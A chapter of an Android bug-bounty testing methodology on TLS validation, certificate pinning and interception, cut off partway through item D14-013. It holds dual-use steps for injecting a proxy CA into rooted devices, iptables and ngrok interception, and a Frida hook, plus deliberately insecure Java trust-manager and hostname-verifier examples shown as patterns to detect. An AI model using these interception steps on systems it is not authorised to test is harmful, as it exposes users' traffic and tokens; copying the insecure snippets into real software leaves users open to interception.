# D14 · Network Security, TLS & Certificate Pinning

> This domain is where mobile testers waste the most effort for the least money, because its most
> famous check — certificate pinning — is P5 by design on every major platform and explicitly
> ineligible on HackerOne. The reportable half is narrow and sharp: a channel that carries an
> authentication assertion, PII or executable content, and that an attacker with **no trusted CA**
> can read or rewrite. That is `insecure_data_transport.cleartext_transmission_of_sensitive_data`
> (VARIES, argued High) at the floor and `server_side_injection.remote_code_execution_rce` (P1) at the
> ceiling when the rewritten response is code the app then loads.

| | |
|---|---|
| **Phases** | P3 network inventory (hosts, stacks, NSC, targetSdk gates), P4 static (trust code, cleartext constants, pin sets, TLS config), P6 dynamic (clean-trust-store MitM, pcap/proxy diff, response tampering) |
| **Milestones** | M3, M4, M6 |
| **VRT ceiling** | `insecure_data_transport\|cleartext_transmission_of_sensitive_data` (**VARIES** — argue High on HackerOne's own AITM standard `CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N`); `broken_authentication_and_session_management\|cleartext_transmission_of_session_token` (**P4**); `broken_authentication_and_session_management\|weak_login_function\|over_http` (**P4**); `insecure_data_transport\|executable_download\|no_secure_integrity_check` (**P4**, override upward with the execution proof) → `server_side_injection\|remote_code_execution_rce` (**P1**) when the MitM'd artefact executes. The pinning nodes `mobile_security_misconfiguration\|ssl_certificate_pinning\|absent` and `\|defeatable` are **P5** and are never the headline |
| **Primary attacker model** | **AM-06** network attacker with no trusted CA. AM-07 (network attacker *with* a trusted CA) is tester convenience and is NOT an attacker model — a finding proved only by installing your own CA is a pinning report and pays nothing. Secondary: AM-09 malicious backend/CDN (response tampering), AM-08 malicious third-party SDK (process-global trust neutering), AM-03 zero-permission local app (loopback / LAN listeners) |
| **Maps to** | MASVS-NETWORK-1, MASVS-NETWORK-2, MASVS-CODE-4; MASTG-TEST-0217, -0218, -0233, -0234, -0235, -0236, -0238, -0242, -0243, -0244, -0282, -0283, -0285, -0286, -0295, MASTG-TECH-0010, -0011, -0012, -0019, -0022, -0028, -0039, -0150, -0151, MASTG-KNOW-0010, -0011, -0014, -0015, MASTG-BEST-0020, -0021, MASTG-TOOL-0008/-0020/-0025/-0029/-0032/-0038/-0075/-0077/-0078/-0081/-0097/-0100/-0101/-0103/-0110/-0120/-0140, MASWE-0026, -0027, -0028, -0029, -0049; CWE-295, CWE-297, CWE-319, CWE-347, CWE-353, CWE-354, CWE-494; ATT&CK T1638, T1521.003 (analytic AN1725), T1639.001, T1632 / T1632.001, T1509, T1637, T1437.001, mitigations M1006, M1009, M1011, M1012; CVE-2021-0341, CVE-2023-3635, CVE-2018-9468, CVE-2018-9493, CVE-2018-9546 |

## Why this domain pays

It mostly does not, and you should know that before you start. Bugcrowd rates
`mobile_security_misconfiguration|ssl_certificate_pinning|absent` **P5** and `|defeatable` **P5** —
bypassing an existing pin is worth exactly as much as never having one. HackerOne's Core Ineligible
Findings list carries "Lack of SSL Pinning" under *Optional security hardening steps / Missing best
practices*, and HackerOne Platform Standards states the rule outright: "If a report requires an attacker
to disable Certificate Pinning in an application, then that is not a valid vulnerability." Xiaomi, Grab,
Spotify, Starbucks and Snapchat all exclude it by name. The VRT changelog even records the node being
moved *out of* `insecure_data_transport` and *into* `mobile_security_misconfiguration` — a formal
reclassification from a transport flaw to a configuration preference. Add to that HackerOne's blanket
"SSL/TLS Configurations" exclusion, Grab's "weak TLS/SSL versions & ciphers", Reddit's "Weak SSL/TLS/SSH
algorithms", Basecamp's "insecure SSL/TLS ciphers unless you have a working proof of concept", and the
graveyard in this chapter is larger than the findings list.

The exception is precise and it still pays well. Reddit's policy is the clearest statement of it:
"Lack of certificate pinning (**improper certificate validation still eligible**)." The distinction is
not rhetorical — it is a different attacker model. Pinning absence needs AM-07, an attacker who has
already got a CA onto the victim's device. Broken *validation* needs only AM-06: a self-signed
certificate on a hostile network, no CA install, no device access, no root. That is the finding class
that produced Twitter #168538 (**High 8.1, $2,100**, "fails to validate server certificate and sends
oauth token"), IBB #2293 which catalogued roughly 75 apps with the same flaw, and Razer #795272 ($750)
for a permissive `HostnameVerifier` scoped to a WebView. Compare Shopify #55644 — pinning absent,
validation correct — rated **none, $0**. Same domain, opposite outcomes, and the only difference is
whether a CA had to be installed for the PoC. Google's Mobile VRP prices the same distinction under
"Theft of sensitive data — sensitive data sent over insecure network connections that can be
intercepted", and its ACE definition ("code can be downloaded from the network and executed") is the
top of this chapter's tree at Tier 1 $9,000 under MitM.

The second thing that pays is coverage, not cleverness. Google's App Security Improvement programme ran
store-wide campaigns for *TrustManager* (2016-02-17), *Insecure Hostname Verification* (2016-11-29) and
*Webview SSLErrorHandler* (2015-07-17) precisely because the base rate was high enough to warrant
forced remediation — and the same defects now live in third-party SDKs rather than app code, where one
`HttpsURLConnection.setDefaultHostnameVerifier` call neuters every connection in the process including
the app's own pinned ones. The highest-yield habit in this chapter is therefore mechanical: run a pcap
beside the proxy and chase every destination the proxy never saw, because raw sockets, gRPC, QUIC,
Cronet, Flutter's BoringSSL and any `OkHttpClient` built with `Proxy.NO_PROXY` are invisible to a proxy
and the stack that deliberately skips the proxy is disproportionately the stack that also skips
validation. And run the whole thing only after the harness acceptance gate passes — the single most
expensive false negative in mobile testing is a broken Conscrypt-APEX CA install reported as "the app
is pinned", which silently hides the entire D15 surface.

## The crux question

**Is there any request on this app's wire that an attacker holding no trusted CA can read or rewrite —
and does that request carry an authentication assertion, PII, or content the app will execute?**
If the answer needs your CA installed to be true, you have a P5 pinning observation, not a finding.

## Triage order

1. **`onReceivedSslError` → `proceed()`** — one grep, one line, and it is a certificate-validation
   bypass on the WebView path that no NSC or pin set touches. Highest signal-per-second in the domain.
2. **Empty / non-throwing `checkServerTrusted`** — provable with a self-signed cert and no CA install,
   which is the entire difference between High and $0.
3. **`HostnameVerifier` returning `true`, and `SSLSocket` with no verifier** — the second case is
   invisible to anyone who only reads the NSC, because `SSLSocket` is not governed by it.
4. **`targetSdk` + NSC read together** — this fixes the baseline. Everything after it is either a
   deliberate opt-out of a platform default (strong) or the platform default itself (graveyard).
5. **Cleartext observed on the wire, attributed to the app's UID** — the manifest attribute is not the
   finding; the plaintext bytes carrying a token are.
6. **pcap-versus-proxy destination diff** — cheap, and it is how you find the unproxied stack that
   nobody reviewed.
7. **`<certificates src="user"/>` or `overridePins="true"` outside `<debug-overrides>`** — a deliberate
   reversal of a platform hardening, provable with a user-store CA and no root.
8. **Expired `<pin-set expiration>`** — the vendor believes pinning is on and it silently is not; it
   reframes a P5 as a lapsed control.
9. **Executable / config / bundle fetched without integrity check** — P4 baseline that you argue to
   ACE, and the only route in this chapter to a P1.
10. **Shadow-API diff on every hardcoded endpoint** — the mobile app's baked-in backend version is
    routinely older and weaker than the web app's; the weakened control is the finding, not the version.
11. **Pinning inventory per host** — last, because it is P5, and its only jobs are to tell you which
    hook to use and to name the unpinned SDK host that carries user identifiers.

## Items

### D14-001 · Fix the TLS baseline from `targetSdkVersion` before reading any config

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a (baseline; governs the rating of every item below) |
| **Attacker** | n/a |
| **Applies to** | all |
| **Maps to** | MASTG-TECH-0150, MASTG-KNOW-0014, MASVS-NETWORK-1 |

- **Test:** Establish the platform defaults that apply to *this* build, so a default is never written up
  as a finding and a deliberate opt-out is never written down as a default.
- **How:**
```bash
aapt2 dump badging base.apk | grep -E "^(sdkVersion|targetSdkVersion|package)"
aapt2 dump xmltree base.apk --file AndroidManifest.xml | \
  grep -iE 'networkSecurityConfig|usesCleartextTraffic|targetSdkVersion|debuggable'
adb shell getprop ro.build.version.sdk     # the device's API level, a separate axis
```
  Verified gates to record in the finding, per the Android NSC reference:
  - cleartext permitted **by default below targetSdk 28**, denied at 28+;
  - **user** CAs in the default trust anchors only at **targetSdk ≤ 23**, excluded from 24;
  - NSC itself available from **API 24**;
  - TLS 1.3 on by default from Android 10; **TLS 1.0/1.1 disallowed for apps targeting Android 15 (targetSdk 35)**;
  - Certificate Transparency **not available ≤ API 35**, opt-in on API 36, default-on with opt-out at API 37+;
  - `<domainEncryption>` (ECH) default **enabled at API 37+**, disabled at 36 and below;
  - **API 34+**: the live trust store is `/apex/com.android.conscrypt/cacerts`; `/system/etc/security/cacerts`
    is ignored at runtime.
- **Proof:** A two-line baseline in the notes — `targetSdk=NN, minSdk=NN, NSC=present/absent,
  usesCleartextTraffic=<value>` — cited in every network finding.
- **Escalation:** Feeds D03 (manifest) and D26 (harness); a low `minSdkVersion` here is the precondition
  for D14-027 and D14-044.
- **Ruled out when:** `targetSdk ≥ 28`, no `usesCleartextTraffic` attribute, an NSC exists with no
  `cleartextTrafficPermitted`, no `src="user"`, no `overridePins`, and `minSdk ≥ 24` — at which point the
  platform defaults are already the hardened ones and every claim below must come from code or the wire,
  not from configuration.

### D14-002 · Pass the harness acceptance gate before asserting anything about pinning

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a |
| **Attacker** | n/a (AM-07 tooling) |
| **Applies to** | all dynamic testing; the Conscrypt/zygote steps are mandatory on API 34+ |
| **Maps to** | MASTG-TECH-0011 (stale for API 34+ — it still documents the `/system` copy), MASTG-TOOL-0077, MASTG-TOOL-0097 |

- **Test:** Prove your CA is trusted *from inside a forked app process* before you conclude the target
  pins. A bind-mount made in your adb shell's namespace is invisible to apps, because `/apex` is mounted
  PRIVATE and every app forks from zygote.
- **How:**
```bash
HASH=$(openssl x509 -inform PEM -subject_hash_old -in ~/.mitmproxy/mitmproxy-ca-cert.pem | head -1)
cp ~/.mitmproxy/mitmproxy-ca-cert.pem ${HASH}.0 && adb push ${HASH}.0 /data/local/tmp/
adb shell su 0 sh -c '
  mkdir -p -m 700 /data/local/tmp/tmp-ca-copy
  cp /apex/com.android.conscrypt/cacerts/* /data/local/tmp/tmp-ca-copy/
  mount -t tmpfs tmpfs /system/etc/security/cacerts
  mv /data/local/tmp/tmp-ca-copy/* /system/etc/security/cacerts/
  mv /data/local/tmp/'${HASH}'.0 /system/etc/security/cacerts/
  chown root:root /system/etc/security/cacerts/*; chmod 644 /system/etc/security/cacerts/*
  chcon u:object_r:system_file:s0 /system/etc/security/cacerts/*'
# the step everyone misses - put the bind in zygote's mount namespace
adb shell su 0 sh -c 'for Z in $(pidof zygote) $(pidof zygote64); do
  nsenter --mount=/proc/$Z/ns/mnt -- /bin/mount --bind \
    /system/etc/security/cacerts /apex/com.android.conscrypt/cacerts; done'
adb shell am force-stop <pkg>
# positive control, from INSIDE an app namespace:
PID=$(adb shell pidof com.android.chrome)
adb shell su 0 nsenter --mount=/proc/$PID/ns/mnt -- ls /apex/com.android.conscrypt/cacerts | grep $HASH
```
  The `chcon u:object_r:system_file:s0` relabel is required or SELinux denies the read. On API ≤ 33 the
  LEGACY route is still correct: `emulator -avd <avd> -writable-system`, `adb root`,
  `adb shell avbctl disable-verification`, `adb remount`, push `<hash>.0` to
  `/system/etc/security/cacerts`, `chmod 644`, reboot.
- **Proof:** A **control app** (Chrome to `https://example.com`) decrypting in mitmproxy on the same
  device, in the same session, captured before you touch the target. File it as
  `lab/harness-baseline-YYYYMMDD.txt`.
- **Escalation:** → D26. Without this line every "the app pins" statement in the report is unfounded.
- **Ruled out when:** The control-app flow decrypts and `nsenter ... ls` shows your hash inside the app
  namespace. Then, and only then, a per-host TLS failure is the app's behaviour and not your lab.

### D14-003 · Never infer pinning from a failed MitM — use the failure *shape* and the platform log

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a (false-positive gate for `mobile_security_misconfiguration\|ssl_certificate_pinning\|absent`) |
| **Attacker** | n/a |
| **Applies to** | all; the APEX trap is specific to API 34+ |
| **Maps to** | MASTG-TEST-0244 (implementation-agnostic), MASTG-TEST-0022 (documents the `X509Util` log line), MASTG-KNOW-0015 |

- **Test:** Decide "pinned / not pinned" from three independent signals, never from whether your proxy
  happened to work.
- **How:**
```bash
# 1. static declaration
grep -rn '<pin-set\|pin digest=' apktool_out/res/xml/
grep -rn 'CertificatePinner\|certificatePinner(\|sslSocketFactory(\|checkServerTrusted\|HostnameVerifier' jadx_out/sources
# 2. failure shape - uniform vs per-host
#    uniform failure across analytics + CDNs + first-party  -> YOUR trust store
#    failure on ONE first-party host while analytics decrypts -> real pinning
# 3. platform log
adb logcat -c; adb shell am force-stop <pkg>; adb shell monkey -p <pkg> 1
adb logcat | grep -iE 'X509Util|Pin verification failed|CertPathValidatorException|Trust anchor'
```
  `I/X509Util: Failed to validate the certificate chain, error: Pin verification failed` is pinning.
  `Trust anchor for certification path not found` is a trust-store problem. Note the classic API 34+
  trap: pushing a hashed CA to `/system/etc/security/cacerts` **succeeds, `chmod` succeeds, and nothing
  trusts it**, producing `Client TLS handshake failed … does not trust the proxy's certificate` for
  *every* host — which reads exactly like pinning.
- **Proof:** The `<pin-set>` XML or `CertificatePinner` call site **plus** the `Pin verification failed`
  line. Absence of both plus a uniform failure is a proved harness defect, not a proved control.
- **Escalation:** Correct classification decides whether the next four hours go into D15 or into D26.
- **Ruled out when:** No pin declaration anywhere, no `Pin verification failed` in logcat, and the
  control app from D14-002 decrypts — the app does not pin, and that is a P5 note, not a finding.

### D14-004 · Run a pcap beside the proxy and chase every destination the proxy never saw

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a (coverage; the severity belongs to what the unproxied channel carries) |
| **Attacker** | n/a |
| **Applies to** | all; mandatory when the APK bundles Cronet, gRPC, Flutter, Unity or Go |
| **Maps to** | MASTG-TECH-0010, MASTG-TEST-0236 (its stated limitation that capture and proxy see different things), MASTG-TOOL-0075, MASTG-TOOL-0081 |

- **Test:** A proxy is a filter, not a capture. It sees only what honours the system HTTP proxy. Raw
  sockets, gRPC, QUIC/HTTP-3, DNS, native/Flutter/Go stacks and any `OkHttpClient` built with
  `Proxy.NO_PROXY` are invisible. The traffic present only in the pcap is the traffic nobody reviewed.
- **How:**
```bash
emulator -avd pt -writable-system -tcpdump cap.pcap -http-proxy 127.0.0.1:8080 &
# device with root:
adb push tcpdump /data/local/tmp/ && adb shell chmod 755 /data/local/tmp/tcpdump
adb shell su -c '/data/local/tmp/tcpdump -i any -p -s 0 -w /sdcard/out.pcap'
adb pull /sdcard/out.pcap
tshark -r out.pcap -Y 'tcp.flags.syn==1 && tcp.flags.ack==0' -T fields -e ip.dst -e tcp.dstport | sort -u > pcap_hosts.txt
tshark -r out.pcap -Y 'udp.dstport==443' -T fields -e ip.dst | sort -u          # QUIC / HTTP-3
tshark -r out.pcap -Y 'http || dns'  -T fields -e http.host -e dns.qry.name | sort -u
comm -23 pcap_hosts.txt proxy_hosts.txt
```
- **Proof:** A destination present in `pcap_hosts.txt` and absent from the proxy's host list, named with
  its port and protocol.
- **Escalation:** Read the TLS validation code of whichever component produced the unproxied flow — a
  stack that deliberately skips the proxy often skips other things too (→ D14-007, D14-023, D19).
- **Ruled out when:** Every SYN destination in the pcap has a corresponding proxied flow, and no UDP/443
  conversations remain after the QUIC block in D14-005.

### D14-005 · Transparent/gateway interception, and forcing QUIC down to TCP

| | |
|---|---|
| **Severity ceiling** | Low |
| **VRT** | n/a as tooling; the proxy-ignoring behaviour is a testability observation |
| **Attacker** | n/a (lab form of AM-06) |
| **Applies to** | all |
| **Maps to** | MASTG-TECH-0010, MASTG-TOOL-0097, MASTG-TOOL-0120 (ProxyDroid) |

- **Test:** When a flow will not appear under a configured proxy, fall back to layer-3 redirection rather
  than to more proxy settings. A flow visible only in transparent mode proves the app deliberately
  ignores proxy configuration.
- **How:**
```bash
sudo sysctl -w net.ipv4.ip_forward=1
sudo iptables -t nat -A PREROUTING -i <iface> -s <dev-ip> -p tcp --dport 80  -j REDIRECT --to-port 8080
sudo iptables -t nat -A PREROUTING -i <iface> -s <dev-ip> -p tcp --dport 443 -j REDIRECT --to-port 8080
mitmproxy --mode transparent --showhost -p 8080
sudo iptables -A FORWARD -s <dev-ip> -p udp --dport 443 -j REJECT   # force QUIC/HTTP-3 down to TCP
# in-process alternative when the app sets Proxy.NO_PROXY:
objection -g <pkg> explore -s "android proxy set 192.168.1.50 8080"
```
  Be the gateway on your own lab AP. **ARP poisoning is the 2016 form and is not reportable**: it is true
  of every OS, needs same-L2 presence, and is defeated by client isolation and MAC randomisation.
- **Proof:** Requests appearing in mitmproxy that were absent with the global proxy set, with no change
  to the device's Wi-Fi settings.
- **Escalation:** None of this defeats pinning. It does unlock D15 for proxy-ignoring stacks and it is a
  line worth writing in the methodology section (enterprise proxies will break the same way).
- **Ruled out when:** The app's flows appear under `settings put global http_proxy` alone — it honours
  the system proxy and there is nothing to note.

### D14-006 · Test the cellular path, not just the lab Wi-Fi

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a (the severity belongs to the cellular-only behaviour found) |
| **Attacker** | AM-06 |
| **Applies to** | apps with carrier integration, silent/header-enrichment auth, eSIM, roaming logic |
| **Maps to** | MASTG-TECH-0011; corpus source sec-88 "Intercepting Cellular Android Traffic via Mobile Data and Ngrok" |

- **Test:** Carrier-network behaviour differs — header enrichment, carrier-specific endpoints, a
  different edge/CDN, and in several apps a *silent-auth* assertion that only exists on mobile data.
  A same-LAN proxy never sees it, so parity is assumed rather than tested.
- **How:**
```bash
# Burp listener on 127.0.0.1:8080, then expose it:
ngrok config add-authtoken <token>
ngrok tcp 8080                       # note e.g. 0.tcp.ngrok.io:12345
# device: Wi-Fi OFF, cellular ON, proxy-manager app -> Host 0.tcp.ngrok.io Port 12345 Type HTTP
# install the CA by browsing to http://burp on the device
```
  Where ngrok is unacceptable, use a self-hosted tunnel or a private WireGuard/OpenVPN endpoint.
- **Proof:** Burp HTTP history populating with the device's Wi-Fi off, plus at least one request or
  header present only on this path.
- **Escalation:** A carrier-injected identifier or an endpoint that skips authentication on the mobile
  network is a D13 finding with a delivery path most assessments never touch.
- **Ruled out when:** A request-by-request diff of the same user journey over Wi-Fi and cellular shows
  identical hosts, paths and headers.

### D14-007 · Custom `X509TrustManager` whose `checkServerTrusted` does not validate

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `insecure_data_transport\|cleartext_transmission_of_sensitive_data` (VARIES — argue High/Critical on demonstrated content) |
| **Attacker** | AM-06 |
| **Applies to** | all API levels; prevalence highest in legacy code paths and third-party SDKs |
| **Maps to** | MASTG-TEST-0282, MASWE-0027, MASTG-KNOW-0010, MASTG-BEST-0021, semgrep rule `mastg-android-network-checkservertrusted`, CWE-295, ATT&CK T1638 |

- **Test:** Any connection configured with a `TrustManager` whose `checkServerTrusted` does not validate
  the chain accepts **any** certificate. This is materially worse than absent pinning: it needs no CA on
  the victim's device at all.
- **How:**
```bash
semgrep -c rules/mastg-android-network-checkservertrusted.yml jadx_out/sources/
grep -rn -A20 'checkServerTrusted' jadx_out/sources/ | less
grep -rn 'X509TrustManager\|TrustManager\[\]\|SSLContext.getInstance\|TrustManagerFactory\|init(null' jadx_out/sources/
# SDK-attributable hits only (exclude the platform's own classes):
grep -rn 'checkServerTrusted\|X509TrustManager' jadx_out/sources/ | grep -viE '^jadx_out/sources/(android|androidx)/'
```
  The canonical vulnerable shape:
```java
new X509TrustManager() {
    public void checkClientTrusted(X509Certificate[] chain, String authType) {}
    public void checkServerTrusted(X509Certificate[] chain, String authType) {}
    public X509Certificate[] getAcceptedIssuers() { return new X509Certificate[]{}; }
};
```
  Runtime confirmation — log which trust managers are actually installed:
```javascript
Java.perform(function () {
  var C = Java.use('javax.net.ssl.SSLContext');
  C.init.overload('[Ljavax.net.ssl.KeyManager;','[Ljavax.net.ssl.TrustManager;','java.security.SecureRandom')
   .implementation = function (k, t, r) {
     if (t) for (var i = 0; i < t.length; i++) console.log('[TM] ' + t[i].$className);
     return this.init(k, t, r); };
});
```
- **Proof:** Full request/response pairs decrypted in mitmproxy while the proxy CA is trusted by
  **nothing** on the device — state in the report that Settings → Trusted credentials → User was empty
  and no system CA was installed. Screenshot that empty list in the same evidence pack.
- **Escalation:** Captured bearer token → D13 replay / account takeover; injected response → D10 WebView
  bridge; substituted update artefact → D17 code load → `server_side_injection|remote_code_execution_rce`.
- **Ruled out when:** Every `checkServerTrusted` body either delegates to a platform-built
  `X509TrustManager` obtained from a `TrustManagerFactory` initialised with `null` (the system anchors),
  or throws `CertificateException`/`IllegalArgumentException` on failure — and a self-signed cert with no
  CA installed produces `SSLHandshakeException`/`Trust anchor for certification path not found` in
  logcat for every host.

### D14-008 · `checkServerTrusted` that validates *something* but not the chain

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `insecure_data_transport\|cleartext_transmission_of_sensitive_data` (VARIES) |
| **Attacker** | AM-06 |
| **Applies to** | all |
| **Maps to** | MASTG-TEST-0282's enumerated failure modes, MASWE-0027, MASTG-KNOW-0010, CWE-295 |

- **Test:** The empty body is the easy case. The paying case is a body that *looks* like validation and
  is not. MASTG enumerates the exact failure modes — check each one by reading the body, not by grepping
  for `{}`:
  1. calls `chain[0].checkValidity()` only — that checks **expiry**, not trust and not hostname;
  2. catches `CertificateException` and logs/suppresses instead of rethrowing;
  3. returns early on a `BuildConfig.DEBUG`-style flag or a `"development"` build-type check that also
     evaluates true in the shipped build;
  4. compares only the certificate's `getSubjectDN()` string, which an attacker controls;
  5. `getAcceptedIssuers()` returning `null` or an empty array where the caller then treats the chain as
     unverifiable-but-acceptable.
- **How:**
```bash
grep -rn -A25 'public void checkServerTrusted' jadx_out/sources/ \
  | grep -nE 'checkValidity|catch *\(|return;|BuildConfig|DEBUG|getSubjectDN|getAcceptedIssuers|Log\.'
grep -rn -A6 'getAcceptedIssuers' jadx_out/sources/ | grep -nE 'return null|new X509Certificate\[0\]'
```
- **Proof:** MitM with a certificate that is (a) **currently valid** and (b) issued by a CA in no trust
  store — this defeats a `checkValidity()`-only implementation specifically and proves the distinction
  to a triager who will otherwise argue "there is validation code there".
- **Escalation:** Identical to D14-007. Quote the MASTG failure-mode list in the report; it pre-empts the
  "we do validate" pushback.
- **Ruled out when:** The body's terminal path is a delegated `checkServerTrusted` on a system-anchored
  `X509TrustManager` with no `catch` that swallows, and interception with a valid-but-untrusted
  certificate fails.

### D14-009 · `HostnameVerifier` returning `true`, or `ALLOW_ALL_HOSTNAME_VERIFIER`

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `insecure_data_transport\|cleartext_transmission_of_sensitive_data` (VARIES) |
| **Attacker** | AM-06 (and any attacker who can buy a certificate for a domain they own) |
| **Applies to** | all |
| **Maps to** | MASTG-TEST-0283, MASWE-0027, CWE-297 "Improper Validation of Certificate with Host Mismatch", semgrep rule `mastg-android-network-hostname-verification`, Google ASI campaign "Insecure Hostname Verification" (2016-11-29), ATT&CK T1638 |

- **Test:** Chain validation can be perfect and the connection still worthless if the hostname is not
  checked: any certificate for any domain the attacker legitimately owns then works. MASTG's failure
  modes: unconditional `return true`; overly broad wildcard matching; incomplete coverage (verifier
  applied to some channels but not all); missing manual verification where it is not automatic.
- **How:**
```bash
semgrep -c rules/mastg-android-network-hostname-verification.yml jadx_out/sources/
grep -rn -A10 'HostnameVerifier' jadx_out/sources/ | grep -n 'return true'
grep -rn 'ALLOW_ALL_HOSTNAME_VERIFIER\|AllowAllHostnameVerifier\|NoopHostnameVerifier\|setHostnameVerifier\|setDefaultHostnameVerifier\|verify(java.lang.String, javax.net.ssl.SSLSession)' jadx_out/sources/
```
  The canonical shape:
```java
SSLSocketFactory sf = new cc(trustStore);
sf.setHostnameVerifier(SSLSocketFactory.ALLOW_ALL_HOSTNAME_VERIFIER);
```
- **Proof:** Present a certificate that is **validly signed for a different hostname** (a domain you
  own, or Burp's per-host CA-signed cert issued for the wrong CN) and show the app completing the
  handshake and sending its request. That isolates hostname verification from chain validation — a
  self-signed cert would not distinguish the two.
- **Escalation:** → D13 (captured session), → D10 (WebView content served from your host), → D17.
- **Ruled out when:** No app- or SDK-authored `HostnameVerifier` exists (the default
  `OkHostnameVerifier`/platform verifier is in use), and a wrong-CN certificate produces
  `SSLPeerUnverifiedException` / `Hostname … not verified` in logcat on every channel including
  WebView and any `SSLSocket` path.

### D14-010 · `SSLSocket` used with no hostname verification at all — and the NSC does not cover it

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `insecure_data_transport\|cleartext_transmission_of_sensitive_data` (VARIES) |
| **Attacker** | AM-06 |
| **Applies to** | all; any raw `SSLSocket`/`SSLSocketFactory.createSocket()` path, common in chat, MQTT, XMPP, custom binary protocols |
| **Maps to** | MASTG-TEST-0234, MASWE-0027, semgrep rule `mastg-android-ssl-socket-hostnameverifier`, CWE-297 |

- **Test:** `SSLSocket` does **not** perform hostname verification by default, and MASTG states the
  consequence explicitly: "The connection succeeds even if the app has a fully secure Network Security
  Configuration (NSC) in place because `SSLSocket` is not affected by it." This is the single most
  common way a vendor's "we use the NSC" answer fails to close a finding.
- **How:**
```bash
semgrep -c rules/mastg-android-ssl-socket-hostnameverifier.yml jadx_out/sources/
grep -rn 'SSLSocketFactory\|createSocket(\|SSLSocket ' jadx_out/sources/
# a correct implementation calls one of these on the socket it just created:
grep -rn 'getDefaultHostnameVerifier\|HttpsURLConnection.getDefaultHostnameVerifier\|setEndpointIdentificationAlgorithm' jadx_out/sources/
```
  The safe pattern is `SSLParameters.setEndpointIdentificationAlgorithm("HTTPS")` or an explicit
  `HttpsURLConnection.getDefaultHostnameVerifier().verify(host, socket.getSession())` after
  `startHandshake()`. Neither present ⇒ unverified.
- **Proof:** A certificate for an unrelated hostname accepted on the `SSLSocket` channel while the same
  certificate is rejected on the app's `HttpsURLConnection`/OkHttp channel — capture both in one
  session, side by side. That pairing is what makes the finding unarguable.
- **Escalation:** Whatever the socket carries — chat messages, MQTT credentials, a token exchange — plus
  full response control (→ D15, D16 if the peer bytes reach a native parser).
- **Ruled out when:** No `SSLSocket` is created outside a library that verifies internally (OkHttp,
  `HttpsURLConnection`), or every created socket is followed by an explicit verifier call or
  `setEndpointIdentificationAlgorithm("HTTPS")`.

### D14-011 · Incomplete verification coverage — right on the main client, wrong on a secondary channel

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `insecure_data_transport\|cleartext_transmission_of_sensitive_data` (VARIES) |
| **Attacker** | AM-06 |
| **Applies to** | all multi-stack apps (an OkHttp API client plus a WebView plus a download/media/socket path) |
| **Maps to** | MASTG-TEST-0283 ("incomplete verification coverage" named as a distinct failure mode), MASWE-0027, CWE-297 |

- **Test:** Enumerate every TLS-bearing channel in the app and test each one separately. Validation is
  routinely correct on the flagship API client and absent on: the image loader, the analytics SDK, the
  file-download path, the WebView, the push/socket channel, and the renegotiation path.
- **How:**
```bash
# enumerate clients and channels
grep -rn 'OkHttpClient(\|new OkHttpClient\|Retrofit.Builder\|HttpURLConnection\|HttpsURLConnection\|Volley\|Cronet\|WebView(\|DownloadManager\|MediaPlayer\|ExoPlayer\|WebSocket' jadx_out/sources/ \
  | grep -viE '^jadx_out/sources/(android|androidx)/' | sort -u
# then, per host, try a wrong-CN cert only for that host:
mitmproxy --mode transparent --showhost --set upstream_cert=false
```
  Drive each feature in turn (log in, load a profile image, download an attachment, play media, open
  the help WebView) with the wrong-CN certificate scoped to that host only.
- **Proof:** A per-channel table in the report: host → stack → outcome (rejected / accepted wrong CN /
  accepted untrusted CA / cleartext). One accepted row is the finding; the table is what makes the
  vendor's "we validate" answer untenable.
- **Escalation:** The weakest channel sets the ceiling — an image loader that accepts anything is a
  content-injection primitive into whatever renders it (→ D10, D16).
- **Ruled out when:** Every enumerated channel rejects both an untrusted CA and a wrong-CN certificate,
  and the channel list is complete against the pcap host list from D14-004.

### D14-012 · `WebViewClient.onReceivedSslError` calling `handler.proceed()`

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `insecure_data_transport\|cleartext_transmission_of_sensitive_data` (VARIES) |
| **Attacker** | AM-06 |
| **Applies to** | all apps with a WebView |
| **Maps to** | MASWE-0027, CWE-295, Google ASI campaign "Webview SSLErrorHandler" (2015-07-17), H1 #795272 (Razer, $750), ATT&CK T1638 |

- **Test:** An app can validate correctly on its API client and still ship a WebView that proceeds
  through certificate errors. This is the highest-signal single grep in the domain.
- **How:**
```bash
grep -rn -A8 'onReceivedSslError' jadx_out/sources/ | grep -n 'proceed()'
grep -rn 'onReceivedSslError\|SslErrorHandler' jadx_out/sources/ | grep -viE '^jadx_out/sources/(android|androidx)/'
grep -rn -A8 'onReceivedClientCertRequest' jadx_out/sources/   # the mTLS sibling
```
  Read the body: a `proceed()` gated on a user dialog is weaker but defensible; an unconditional
  `handler.proceed()` — or one gated on `BuildConfig.DEBUG` that still evaluates true — is the finding.
- **Proof:** WebView content served from your proxy with an **untrusted** certificate, with no
  user-visible warning, and the app's session cookie present in the request. Screenshot the rendered
  page plus the proxy entry.
- **Escalation:** Own the WebView's origin → the JS bridge behind it (→ D10). This is the cheapest
  precondition in the whole bridge-exploitation chain, because it needs no deep link and no XSS.
- **Ruled out when:** No `onReceivedSslError` override exists (the platform default cancels the load),
  or the override calls `handler.cancel()` on every path, verified by serving an untrusted certificate
  and observing `net::ERR_CERT_AUTHORITY_INVALID` with the load aborted.

### D14-013 · A third-party SDK installing a process-global permissive verifier or socket factory

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `insecure_data_transport\|cleartext_transmission_of_sensitive_data` (VARIES) |
| **Attacker** | AM-08 (malicious/negligent SDK) delivering the defect; AM-06 exploiting it |
| **Applies to** | all; the defect is now more common in SDKs than in app code |
| **Maps to** | MASWE-0027, CWE-295, Google ASI campaigns "TrustManager" (2016-02-17) and "Insecure Hostname Verification" (2016-11-29), Google risk pages `unsafe-trustmanager` / `unsafe-hostname` |

- **Test:** `HttpsURLConnection.setDefaultHostnameVerifier(...)` and
